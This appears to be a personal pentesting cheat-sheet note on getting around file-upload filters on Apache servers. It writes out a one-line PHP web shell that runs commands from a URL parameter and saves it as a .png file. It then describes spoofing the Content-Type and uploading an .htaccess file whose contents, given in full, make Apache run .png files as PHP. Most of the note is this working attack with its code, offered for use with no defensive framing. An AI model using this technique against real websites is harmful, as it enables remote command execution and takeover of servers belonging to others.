## bypass trick for upload 

    when a website allowing you to upload file like png images and then the server is apache 
        Note: it's possible to Trick the Apache into uploading malicious image file containing embedded php code and actually get it executed 
            for exemple:
                echo '<?php  echo system($_GET["cmd"]); ?>' > malicious.png

            -first you can trick the Content-Type if the page does'nt only check for the extension
            -secondly , write and upload a .htaccess

            { code } .htaccess content 
                <Files "malicious.png">
                AddHandler application/x-httpd-php  .png
                </Files> 

            ## tips : then just modify the name of the file + plus the content in the request to actually upload .htaccess file 

            and here you go 
